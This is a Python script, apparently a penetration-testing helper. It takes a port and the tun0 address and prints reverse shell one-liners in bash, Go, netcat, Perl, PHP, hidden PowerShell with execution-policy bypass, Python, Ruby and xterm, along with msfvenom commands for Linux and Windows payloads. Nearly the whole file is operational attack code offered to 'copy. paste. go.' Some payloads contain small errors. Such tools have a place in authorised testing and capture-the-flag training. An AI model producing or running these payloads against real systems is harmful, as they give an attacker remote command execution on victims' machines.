#! /usr/bin/env python3

# Reverse shell generator based on examples pulled from:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# This is uses the tun0 IPv4 address. Just specify a listening port. copy. paste. go.

import sys
import os

if len(sys.argv) != 2:
    print("Usage: ./shellgen.py PORT")
else:
    ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    port = sys.argv[1]
    print(("\033[1;32m[*]tun0 IP: " + ip + " port: " + port))
    bash = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
    bash2 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196"
    go = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial(\"tcp",\""""+ip+""":"""+port+"""\");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
    nc = """nc -e /bin/sh """+ip+""" """+port
    nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
    ncatssl = """ncat --ssl -vv -l -p """+port+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
    lin_sl = """msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f elf >reverse.elf"""
    perl= """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
    php = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
    php2 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
    powershell1 = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+ip+"""","""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    powershell2 = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+ip+"""\',"""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
    python2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
    ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
    win_sl = """msfvenom -p windows/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f exe > reverse.exe"""
    xterm = """xterm -display """+ip+""":"""+port
    print("")
    print("\033[1;35m[*] BASH\033[1;m\n" + bash + "")
    print("\033[1;35m[*] BASH2\033[1;m\n" + bash2 + "\n")
    print("\033[1;35m[*] GO\033[1;m\n" + go + "\n")
    print("\033[1;35m[*] LINUX STAGELESS TCP\033[1;m\n" + lin_sl + "\n")
    print("\033[1;35m[*] NETCAT\033[1;m\n" + nc + "")
    print("\033[1;35m[*] NETCAT WITH MKFIFO\033[1;m\n" + nc2 + "\n")
    print("\033[1;35m[*] NCAT SSL\033[1;m\n" + ncatssl + "\n")
    print("\033[1;35m[*] PERL\033[1;m\n" + perl + "\n")
    print("\033[1;35m[*] PHP\033[1;m\n" + php + "")
    print("\033[1;35m[*] PHP2\033[1;m\n" + php2 + "\n")
    print("\033[1;35m[*] POWERSHELL1\033[1;m\n" + powershell1 + "")
    print("\033[1;35m[*] POWERSHELL2\033[1;m\n" + powershell2 + "\n")
    print("\033[1;35m[*] PYTHON\033[1;m\n" + python + "")
    print("\033[1;35m[*] PYTHON2\033[1;m\n" + python2 + "\n")
    print("\033[1;35m[*] RUBY\033[1;m\n" + ruby + "\n")
    print("\033[1;35m[*] WIN STAGELESS TCP\033[1;m\n" + win_sl + "\n")
    print("\033[1;35m[*] XTERM\033[1;m\n" + xterm + "\n")
